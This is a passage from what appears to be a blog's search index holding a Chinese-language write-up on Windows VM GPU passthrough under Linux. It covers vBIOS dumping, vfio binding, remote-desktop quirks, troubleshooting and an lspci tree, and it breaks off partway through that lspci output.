<p>nv\u7684\u6709rom\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\u7684\u95ee\u9898\uff0camd\u6ca1\u6709 Furthermore, it seems only NVIDIA cards have this problem and even then only some. They can be initialized once per boot. That's it. AMD cards don't seem to have this problem AFAIK and present their rom the same all the time, so the VM has no trouble initializing them again and again and again once given one.</p> <p>\u4ec0\u4e48\u4f7f\u7528\u9700\u8981\u6307\u5b9abios This means that if your motherboard draws to the GPU on boot with system information, a logo and what not on the GPU you want to pass through then you're already too late and would need a vbios file if you cannot stop this behavior in your host's bios settings.</p> <p>If your motherboard doesn't have an option to strictly pick which GPU to use (integrated vs dedicated, or an option of\u00a0which\u00a0of multiple dedicated to use) it may initialize it too and you will need a vbios file for a guest all the same.</p> <p>Single GPU hosts don't get any choice and have to draw their POST information ...somewhere... So you will almost always need a vbios file outside very special motherboard configurations (Usually Server boards handle this nicely, even if they only have a shitty onboard 8MB vga plug for basic terminal display only)</p> <p>Basically if the host uses the card at all, it's initialized and the rom is borked for the boot. A vbios file will be needed for a guest to reinitialize it and works around this nicely.</p> <p>\u53ef\u4ee5\u52a8\u6001\u76f4\u901a\u663e\u5361\uff1f I personally don't think about it too much. I've written my\u00a0own vfio script\u00a0compatible with my single GPU host and use a vbios file and use my linux desktop for as long as I like until I want to pass the gpu to the guest, it dynamically unbinds the nvidia driver and stops lightdm before starting the guest with the vbios romfile included to reinitialize the card.</p> <p>\u4e0d\u5173\u673a\u91cd\u7f6egpu\uff1f This makes me imagine that putting a PC to sleep then waking it as you start your qemu VM may be another way to 'reboot' the GPU and restore its vbios rom ready for the guest without a true host reboot (With a low enough sleep state), but who wants to do that. Maybe something for me to experiment with though. It could also help make the GPU more stable when returning to a host in some circumstances.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#dump-vbios","title":"dump vbios","text":"<p>Dump_GPU_vBIOS/dump_vbios.sh at master \u00b7 SpaceinvaderOne/Dump_GPU_vBIOS (github.com) (8) How to dump GPU VBIOS on linux? : VFIO (reddit.com) <pre><code>cd /sys/bus/pci/devices/0000:0a:00.0\necho 1 &gt; rom\ncat rom &gt; /tmp/vbios\necho 0 &gt; rom\n</code></pre></p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5355gpu\u76f4\u901a","title":"\u5355gpu\u76f4\u901a?","text":"<p>(8) Single Nvidia passthrough: endless kernel NVRM logs : VFIO (reddit.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#rdp\u5f88\u5361","title":"RDP\u5f88\u5361","text":"<p>\u53d1\u73b0\u8bbe\u5907\u7ba1\u7406\u5668\u4e2d\u663e\u793a\u7684\u662fMicrosoft\u57fa\u672c\u663e\u793a\u9002\u914d\u5668\uff0c\u5728\u663e\u793a\u9002\u914d\u5668\u4e0a\u624b\u52a8\u5b89\u88c5QXL\u9a71\u52a8\u540e\u89e3\u51b3\uff08\u4f4d\u4e8evirtio\u5149\u76d8\u7684qxlod\u76ee\u5f55\u4e0b\uff09</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#vnc\u4e0erdp","title":"VNC\u4e0eRDP","text":"<ul> <li> <p>\u8fdc\u7a0b\u684c\u9762RDP\u4f7f\u7528\u81ea\u5df1\u7684remote display\u663e\u793a\u9002\u914d\u5668\uff0c\u548c\u4e00\u4e2a\u901a\u7528\u975e\u5373\u63d2\u5373\u7528\u8bbe\u5907(uPnP)</p> </li> <li> <p>tightvnc\u5219\u4f1a\u4f7f\u7528QXL controller + PnP</p> </li> </ul> <p></p> <ul> <li>\u540e\u9762\u53d1\u73b0\u8c8c\u4f3ctightvnc\u548cparsec\u8fdc\u7a0b\u8fde\u63a5\uff08\u4f7f\u7528\u865a\u62df\u663e\u793a\u9002\u914d\u5668\uff09\u548cVNC\uff08\u4f7f\u7528\u663e\u5361\u6216\u8005QXL\uff09\u90fd\u4f1a\u4f7f\u7528\uff0c\u4f18\u5148VNC\u3002</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#parsec\u8fde\u63a5\u73a9\u6e38\u620f\u5f88\u7cca","title":"parsec\u8fde\u63a5\u73a9\u6e38\u620f\u5f88\u7cca","text":"<p>\u53d1\u73b0\u662f\u663e\u793a\u5668\u9009\u62e9\u4e86125%\u7684\u7f29\u653e\u5bfc\u81f4\u7684</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#steam-link\u8fde\u63a5\u65f6windows\u7528\u6237\u767b\u5f55\u5f39\u7a97","title":"steam link\u8fde\u63a5\u65f6windows\u7528\u6237\u767b\u5f55\u5f39\u7a97","text":"<p>\u53c2\u8003\uff1aCan't get past Steam Input Dialog Box :: Steam Remote Play (steamcommunity.com)</p> <p>\u95ee\u9898\u4e3a\u4f7f\u7528steam link\u8fde\u63a5\u65f6\uff0cwindows\u9700\u8981\u767b\u5f55\u3002\u4f46\u662f\u4f1a\u5f39\u51fa\u4e00\u4e2a\u7a97\u53e3\uff0c\u8bf4\uff1aWould you like to accept secure desktop input from Steam? steam link\u8fdc\u7a0b\u767b\u9646\u65f6\u65e0\u6cd5\u70b9\u51fb\u7cfb\u7edf\u5f39\u7a97\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8fdb\u5165\u3002\u5f39\u7a97\u4e5f\u8bf4\u9700\u8981\u5750\u5728\u7535\u8111\u524d\u70b9\u51fb\u786e\u8ba4</p> <p>\u89e3\u51b3\uff1a\u5982\u679cwindows\u6ca1\u6709\u9501\u5c4f\uff0c\u90a3\u4e48steam link\u767b\u5f55\u5c31\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\u767b\u5f55windows\u3002\u53ef\u4ee5\u5728windows\u4e0a\u5b89\u88c5tightvnc\uff0c\u901a\u8fc7vnc\u8fde\u63a5\u540e\uff0csteam link\u8fde\u63a5\u65f6\u5c31\u4e0d\u4f1a\u8f93\u5bc6\u7801\u4e86\uff08\u800c\u4e14vnc\u8fde\u63a5\u4e5f\u4e0d\u4f1a\u6389\uff09</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#windows\u865a\u62df\u673a\u5185obs\u5f55\u5c4f","title":"Windows\u865a\u62df\u673a\u5185OBS\u5f55\u5c4f","text":"<p>\u901a\u8fc7rdp\u8fdc\u7a0b\u8fde\u63a5windows\u65f6\u4f7f\u7528OBS\u5f55\u5c4f\uff0c\u4f1a\u53d1\u73b0\u65ad\u5f00rdp\u8fde\u63a5\u540e\uff0c\u5f55\u5230\u7684\u662f\u9ed1\u5c4f\u3002\u539f\u56e0\u662frdp\u8fde\u63a5\u65f6\uff0c\u4f7f\u7528\u7684\u662f\u865a\u62df\u7684\u663e\u793a\u9002\u914d\u5668\uff08\u56e0\u6b64\u65e0\u6cd5\u8c03\u8282\u5206\u8fa8\u7387\uff09\uff0c\u865a\u62df\u7684\u58f0\u5361\u3002\u5f53\u65ad\u5f00\u8fde\u63a5\u65f6\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u6d88\u5931\uff0c\u6545\u65e0\u6cd5\u5f55\u5c4f\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\u4e3a\u4f7f\u7528vnc\uff0cvnc\u8fde\u63a5\u540e\u5f00\u542f\u5f55\u5c4f\uff0c\u65ad\u5f00\u8fde\u63a5\u540e\uff0c\u4ecd\u7136\u5728\u5f55\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#linux\u542f\u52a8\u65f6\u9ed1\u5c4f","title":"Linux\u542f\u52a8\u65f6\u9ed1\u5c4f","text":"<p>\u7531\u4e8ehost gpu\u5904\u4e8e\u7b2c\u4e8c\u4e2a\u69fd\uff0c\u5bfc\u81f4X\u542f\u52a8\u5931\u8d25</p> <p>https://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#X_does_not_start_after_enabling_vfio_pci</p> <p>\u8fd9\u91cc\u4e5f\u63d0\u5230\u4e86</p> <p>https://wiki.archlinux.org/title/PCI_passthrough_via_OVMF#Host_unable_to_boot_and_stuck_in_black_screen_after_enabling_vfio</p> <p>\u89e3\u51b3</p> <ul> <li>kernel cmd   <pre><code>video_vifib=off\n</code></pre></li> <li>xorg   <pre><code>/etc/X11/xorg.conf.d/second_gpu.conf\nSection \"Device\"\n        Identifier \"AMD GPU\"\n        Driver \"amdgpu\"       #\u586blspci\u770b\u5230\u7684\u9a71\u52a8\n        BusID  \"PCI:4:0:0\"    #bus id, device id, function id\nEndSection\n</code></pre></li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#windows\u542f\u52a8\u65f6\u5faa\u73af\u84dd\u5c4f","title":"Windows\u542f\u52a8\u65f6\u5faa\u73af\u84dd\u5c4f","text":"<p>windows\u542f\u52a8\u65f6\u84dd\u5c4f\uff0c\u84dd\u5c4f\u4e24\u6b21\u540e\u8fdb\u5165\u6062\u590d\u754c\u9762\uff0c\u9009\u62e9\u5173\u673a\u540e\u518d\u6b21\u542f\u52a8\u4f9d\u7136\u84dd\u5c4f\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u8fdb\u4e00\u6b65\u53d1\u73b0","title":"\u8fdb\u4e00\u6b65\u53d1\u73b0","text":"<p>\u91cd\u542flinux\u65f6\uff0c\u5982\u679c\u76f4\u901a\u7684\u663e\u5361\u4e0a\u8fde\u7740\u663e\u793a\u5668\uff0c\u90a3\u4e48windows\u542f\u52a8\u5c31\u4f1a\u5faa\u73af\u84dd\u5c4f\u3002\u89e3\u51b3\u529e\u6cd5\u4e3a\u5148\u62d4\u6389\u663e\u793a\u5668\uff0clinux\u542f\u52a8\u540e\u518d\u63d2\u4e0a\uff0c\u4e4b\u540e\u542f\u52a8VM-windows\u5c31\u4e0d\u4f1a\u84dd\u5c4f\u3002</p> <p>\u84dd\u5c4f\u65f6\u4ee3\u7801\u4e3a</p> <pre><code>\u7ec8\u6b62\u4ee3\u7801: VIDEO TDR FAILURE\n\u5931\u8d25\u7684\u64cd\u4f5c\uff1anvlddmkm.sys\n</code></pre>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u89e3\u51b3","title":"\u89e3\u51b3","text":"<p>\u53d1\u73b0\u95ee\u9898\u53ef\u80fd\u662f\u7531\u4e8e\u5c06boot GPU\u76f4\u901a\u5bfc\u81f4\u7684PCI passthrough via OVMF - ArchWiki (archlinux.org)</p> <p>The GPU marked as\u00a0<code>boot_vga</code>\u00a0is a special case when it comes to doing PCI passthroughs, since the BIOS needs to use it in order to display things like boot messages or the BIOS configuration menu. To do that, it makes\u00a0a copy of the VGA boot ROM which can then be freely modified.</p> <p>\u4f46\u662f\u6211\u7684\u4e3b\u677f\u6ca1\u529e\u6cd5\u8c03\u8282\u4f7f\u7528\u54ea\u4e2aGPU\u4f5c\u4e3a\u542f\u52a8GPU \u5728https://blog.twenska.de/blog/GPU_passthrough/\u4e2d\u770b\u5230\u7c7b\u4f3c\u95ee\u9898\uff0c\u5e76\u63d0\u5230\u89e3\u51b3\u65b9\u6cd5</p> <p>\u67e5\u770b<code>/var/log/libvirt/qemu/win10.log.0</code>\u4f1a\u53d1\u73b0\u5927\u91cf\u7684\u4ee5\u4e0b\u9519\u8bef\uff1a</p> <pre><code>2022-07-21T06:50:56.222055Z qemu-system-x86_64: vfio_region_write(0000:08:00.0:region1+0x345990, 0x13801,8) failed: Device or resource busy\n</code></pre> <p>\u7136\u540e\u542f\u52a8\u865a\u62df\u673a\u524d\u8fd0\u884c\u4ee5\u4e0b\u811a\u672c\u5373\u53ef</p> <pre><code>#!/bin/bash\necho 1 &gt; /sys/bus/pci/devices/0000\\:08\\:00.0/remove &amp;&amp; echo 1 &gt; /sys/bus/pci/rescan\nvirsh start win10\n</code></pre> <p>\u53d1\u73b0Arch wiki\u63d0\u5230\u76f8\u540c\u7684\u89e3\u51b3\u65b9\u6cd5BAR_3:_cannot_reserve[mem]</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#parsec-\u62a5\u9519","title":"parsec \u62a5\u9519","text":"<p>Error Codes - 14003 (Failed to Capture the Host Display) \u2013 Parsec \u5bfc\u81f4\u8fd9\u4e2a\u9519\u8bef\u7684\u597d\u591a - \u5c11\u6570\u6e38\u620f\u5168\u5c4f\u4f1a\u4f7f\u5f97\u5206\u8fa8\u7387\u4fe1\u606f\u9519\u8bef - \u5173\u95ed\u4e86\u663e\u793a\u5668 - \u540c\u65f6\u4f7f\u7528windows rdp\u548cparsec</p> <ul> <li>If running a headless system, or attempting to run Parsec from a virtual machine that has a GPU passed through to it, you will need to simulate a display being plugged into the GPU.</li> <li>You can make use of\u00a0Parsec's virtual displays, available in the host settings. The free version of Parsec has a \"Fallback To Virtual Display\" which adds a single virtual display if no other displays are present.\u00a0Learn how to set it up at the bottom of the virtual displays page</li> <li>Alternatively, you can purchase a HDMI dongle to generate a monitor, (we recommend this one). Using an HDMI Dongle can be problematic if you also plan to physically use this host machine, as while the headless hdmi dongle is plugged in, you will have an invisible monitor at all times</li> <li>On QUADRO or TESLA graphics you might be able to\u00a0simulate an EDID via NVIDIA Control Panel</li> </ul> <p>For the best performance, you should close all RDP sessions before connecting with Parsec. Parsec is generally able to stay connected at the same time as RDP, but performance will be significantly worse. Since Windows 10 Build 1903, WDDM graphics mode causes bugs while Parsec and RDP are used together. If you get error -14003, turn off WDDM graphics in favor of XDDM:</p> <ul> <li>Run \"Edit group policy\"</li> <li>Navigate to Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Windows Components &gt; Remote Desktop Services &gt; Remote Desktop Session Host &gt; Remote Session Environment</li> <li>Set \"Use WDDM graphics display driver...\" to \"Disabled\"</li> </ul>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#seabios-or-ovmf","title":"SeaBIOS or OVMF","text":"<p>OVMF is an open-source UEFI firmware for QEMU virtual machines. While it is possible to use SeaBIOS to get similar results to an actual PCI passthrough, the setup process is different and it is generally preferable to use the EFI method if your hardware supports it.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#amd-5600xt\u76f4\u901a\u540ecode43","title":"AMD 5600XT\u76f4\u901a\u540ecode43","text":"<p>\u4ece\u539f\u672c\u76841060 3g\u6362\u6210\u4e865600xt\u3002 \u521a\u5f00\u59cb\u8fdb\u5165\u7cfb\u7edf\uff0c\u663e\u5361\u663e\u793a\u663e\u793a\u9002\u914d\u5668\uff0ccode 31\u3002\u8fc7\u4e86\u4e00\u4f1a\u513f\u4e4b\u540e\uff0c\u81ea\u5df1\u5b89\u88c5\u9a71\u52a8\uff0c\u8bc6\u522b\u51fa\u662f5600xt\u4e86\u3002 \u4f46\u662f\u663e\u793a\u5668\u4ecd\u7136\u662f\u9ed1\u5c4f\uff0c\u663e\u793acode 43\u3002\u6309\u7167arch wiki\u4e0a\u5199\u7684 - AMD\u6216\u8005\u8001\u7248Nvidia\u9a71\u52a8\uff08\u65b0\u7248nv\u9a71\u52a8\u4e0d\u4f1a\uff09\u4f1a\u8bc6\u522b\u662f\u865a\u62df\u673a\u4ece\u800c\u62d2\u7edd\u5de5\u4f5c\u3002xml\u9700\u8981\u6dfb\u52a0\u914d\u7f6e\u3002 <pre><code>$ virsh edit vmname\n\n&lt;features&gt;\n  &lt;hyperv&gt;\n    ...\n    &lt;vendor_id state='on' value='randomid'/&gt;\n  &lt;/hyperv&gt;\n  # nv\u9700\u8981\u989d\u5916\u6dfb\u52a0\u4ee5\u4e0b\u914d\u7f6e\n  &lt;kvm&gt;\n    &lt;hidden state='on'/&gt;\n  &lt;/kvm&gt;\n&lt;/features&gt;\n</code></pre></p> <p>\u4f46\u662f\u6211\u8bd5\u4e86\u4e4b\u540e\u8fd8\u662f\u4e0d\u884c\uff0crandomid\u6211\u8bd5\u4e86\u6539\u4e3a\"012345678ab\"\u4e5f\u4e0d\u884c\uff08\u6765\u81ea\u5176\u5b83\u535a\u5ba2\uff09</p> <p>\u6ce8\u610f\u5230\u6211\u542f\u52a8host\u65f6\uff0cubuntu\u542f\u52a8\u754c\u9762\u662f\u663e\u793a\u5728\u63d2\u5728AMD gpu\u4e0a\u7684\u663e\u793a\u5668\uff0c\u800c\u975e\u4e0d\u663e\u5361\u76f4\u901a\u7684\u663e\u793a\u5668\u3002\u56e0\u6b64\u6000\u7591\u662f\u4e0d\u662f\u56e0\u4e3a\u76f4\u901a\u7684\u663e\u5361\u4e3aboot\u663e\u5361\uff0c\u5bfc\u81f4\u4f20\u5165\u865a\u62df\u673a\u7684\u663e\u5361bios\u88ab\u4fee\u6539\u8fc7\u4e86\u3002\u5bfc\u81f4\u9a71\u52a8\u62a5\u9519\u3002</p> <p>The GPU marked as\u00a0<code>boot_vga</code>\u00a0is a special case when it comes to doing PCI passthroughs, since the BIOS needs to use it in order to display things like boot messages or the BIOS configuration menu. To do that, it makes\u00a0a copy of the VGA boot ROM which can then be freely modified. This modified copy is the version the system gets to see, which the passthrough driver may reject as invalid. As such, it is generally recommended to change the boot GPU in the BIOS configuration so the host GPU is used instead or, if that is not possible, to swap the host and guest cards in the machine itself.</p> <p>\u4e8e\u662f\u5c1d\u8bd5\u76f4\u901a\u7684\u663e\u5361\u4e0d\u63d2\u663e\u793a\u5668\u542f\u52a8host\uff0c\u867d\u7136\u4e0d\u77e5\u4e3abios\u81ea\u68c0\u663e\u793a\u663e\u5361\u6ca1\u901a\u8fc7\uff0c\u4eae\u767d\u706f\uff0c\u4f46\u662f\u6700\u7ec8\u8fd8\u662f\u8fdb\u4e86\u7cfb\u7edf\u3002\u671f\u95f4\uff0c\u542f\u52a8\u754c\u9762\u7684logo\u989c\u8272\u6709\u70b9\u5f02\u5e38\uff08\u663e\u793a\u5668\u63d2\u5728\u975e\u76f4\u901a\u7684\u663e\u5361\u4e0a\uff0c\u540e\u9762\u53d1\u73b0\u8c8c\u4f3c\u66f4\u65b0\u4e3anvidia\u9a71\u52a8\u540e\uff08\u539f\u672c\u4e3anveau\uff09\u6ca1\u6709\u8be5\u95ee\u9898\uff09</p> <p>\u8fdb\u5165\u7cfb\u7edf\u540e\uff0c\u542f\u52a8\u865a\u62df\u5668\uff0c\u4e00\u5207\u6b63\u5e38\u3002</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5b89\u88c5nvidia\u9a71\u52a8\u540e\u542f\u52a8\u4f1a\u53cd\u590dload-nvidia\u9a71\u52a8","title":"\u5b89\u88c5nvidia\u9a71\u52a8\u540e\u542f\u52a8\u4f1a\u53cd\u590dload nvidia\u9a71\u52a8","text":"<p>\u76f8\u5f53\u4e8ebind vifo\u4e0d\u8d77\u4f5c\u7528\uff1f</p> <pre><code>NVRM: The NVIDIA probe routine was not called for 1 device(s)\n</code></pre> <p>grub2 - How to temporarily blacklist nvidia driver at boot time - Ask Ubuntu</p> <pre><code>module_blacklist=nvidia\n</code></pre> <p>(8) After loading vfio-pci instead of nvidia, my dmesg has dozens of errors : VFIO (reddit.com)</p> <p>\u7406\u8bba\u4e0a\u662f\u4e0d\u9700\u8981blacklist driver\u7684\uff0c\u4e0d\u7136\u5982\u679c\u662f\u4e24\u5f20nv\u7684\u663e\u5361\uff0c\u5219\u53e6\u4e00\u5f20\u5c82\u4e0d\u662f\u65e0\u6cd5\u4f7f\u7528nvidia\u9a71\u52a8\uff1f</p> <p>I have a setup with two nVidia cards (GTX 970 for passthrough and GT 1030 for Linux host) and I'm not blacklisting anything.</p> <p>(8) After loading vfio-pci instead of nvidia, my dmesg has dozens of errors : VFIO (reddit.com) /etc/modprobe.d/nvidia.conf: (You probably will have to create this file.) <pre><code>softdep nvidia pre: vfio-pci\n</code></pre></p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#1070--1060","title":"1070 + 1060","text":"<p>\u5b89\u88c5\u4e86nvidia-driver-535-server-open \u7ed3\u679c\u542f\u52a8\u65f6\u62a5 <pre><code>NVRM cpuidInfoAMD: unrecognized amd processor in cpuidinfoamd\n</code></pre> \u7136\u540e\u8fdb\u5165\u7d27\u6025\u6a21\u5f0f\u3002 - \u8fdc\u7a0bkvm\u770b\u4e0d\u5230\u753b\u9762\uff0c\u56de\u5230\u5b9e\u9a8c\u5ba4\u540e\uff0c\u63d2\u4e0a\u7269\u7406\u663e\u793a\u5668\u4e5f\u770b\u4e0d\u5230\u8f93\u51fa\u3002 - \u5f3a\u5236\u91cd\u542f\u540e\u53ef\u4ee5\u770b\u5230\u8f93\u51fa\uff0c\u7136\u540e\u5c31\u8fdb\u5165\u4e86\u7d27\u6025\u6a21\u5f0f</p> <p>\u901a\u8fc7moudle_blacklist=nvidia\uff0c\u53ef\u4ee5\u8fdb\u5165\u7cfb\u7edf\u3002\uff08\u7ed3\u679c\u7cfb\u7edf\u7684\u7f51\u7edc\u51fa\u4e86\u95ee\u9898\uff0cping\u7b49\u90fd\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f\u4e00\u65e6curl\u5c31\u5361\u4f4f\uff0c\u4e0d\u6e05\u695a\u4e3a\u4ec0\u4e48\uff09</p> <p>binding vfio - \u4e3a\u4e86\u9632\u6b62host\u8bbf\u95eegpu\uff0c\u8bbe\u7f6e\u7684\u4e00\u4e2aplaceholder\u9a71\u52a8 - \u6709\u4e24\u79cd\u65b9\u5f0fbind\uff1alinux kernel cmdline\uff0cmodprobe.d\uff08\u9700\u8981\u4fee\u6539initramfs\uff09</p> <p>early bind - modprobe - \u76f4\u63a5\u52a0\u8f7d\u5230initramfs\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4initramfs\u53d8\u5927\uff0c\u52a0\u8f7d\u53d8\u6162   - mkinitcpio, booster\u7b49\u65b9\u5f0f</p> <p>If you are modesetting the\u00a0<code>nvidia</code>\u00a0driver, the\u00a0<code>vfio-pci.ids</code>\u00a0must be embedded in the initramfs image. If given via kernel arguments, they will be read too late to take effect. Follow the instructions in\u00a0#Binding vfio-pci via device ID\u00a0for adding the ids to a modprobe conf file.</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u6027\u80fd\u4f18\u5316","title":"\u6027\u80fd\u4f18\u5316","text":"<p>https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html-single/virtualization_tuning_and_optimization_guide/index</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#using-looking-glass-to-stream-guest-screen-to-the-host","title":"Using Looking Glass to stream guest screen to the host","text":"<p>gnif/LookingGlass: An extremely low latency KVMFR (KVM FrameRelay) implementation for guests with VGA PCI Passthrough. (github.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#acs-patch","title":"ACS patch","text":"<p>\u6700\u65e9\u7684patch\uff1aLKML: Alex Williamson: [PATCH] pci: Enable overrides for missing ACS capabilities</p> <p>VFIO tips and tricks: IOMMU Groups, inside and out VFIO tips and tricks: VFIO+VGA FAQ</p> <p>\u81ea\u52a8\u7f16\u8bd1\u5185\u6838 mdPlusPlus/VFIO: This repository contains all my work in the VFIO space (github.com)</p> <p>acs_patch id\u7528\u6cd5\uff1aHelp with PCI Express passthrough (ACS - IOMMU issue) + kernel bugfix | Proxmox Support Forum</p> <p>\u5176\u5b83\uff1a \u8fd9\u4e2avendor-reset\u662f\u5e72\u561b\u7528\u7684\uff1a gnif/vendor-reset: Linux kernel vendor specific hardware reset module for sequences that are too complex/complicated to land in pci_quirks.c (github.com) \u63d0\u5230\u5b89\u5168\uff1a(4) Is ACS override really that unsafe? : VFIO (reddit.com)</p>","tags":["gcc","mpi"]},{"location":"%E6%8A%98%E8%85%BE/2022/07/16/2022-07-16-Linux%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B6%E6%98%BE%E5%8D%A1%E7%9B%B4%E9%80%9A/#\u9644\u5f55","title":"\u9644\u5f55","text":"<pre><code>\u279c  ~ lspci -tv\n-[0000:00]-+-00.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse Root Complex\n           +-00.2  Advanced Micro Devices, Inc. [AMD] Starship/Matisse IOMMU\n           +-01.0  Advanced Micro Devices, Inc. [AMD] Starship/Matisse PCIe Dummy Host Bridge\n           +-01.1-[01]----00.0  Samsung Electronics Co Ltd NVMe SSD Controller PM9A1/PM9A3/980PRO\n           +-01.2-[02-07]--+-00.0  Advanced Micro Devices, Inc. [AMD] 500 Series Chipset USB 3.1 XHCI Controller\n           |               +-00.1  Advanced Micro Devices, Inc. [AMD] 500 Series Chipset SATA Controller\n           |               \\-00.2-[03-07]--+-00.0-[04]--+-00.0  Advanced Micro Devices, Inc. [AMD/ATI] Baffin [Radeon RX 550 640SP / RX 560/560X]\n           |                               |            \\-00.1  Advanced Micro Devices, Inc. [AMD/ATI] Baffin HDMI/DP Audio [Radeon RX 550 640SP / RX 560/560X]\n           |                               +-04.0-[05]----00.0  KIOXIA Corporation NVMe SSD\n           |                              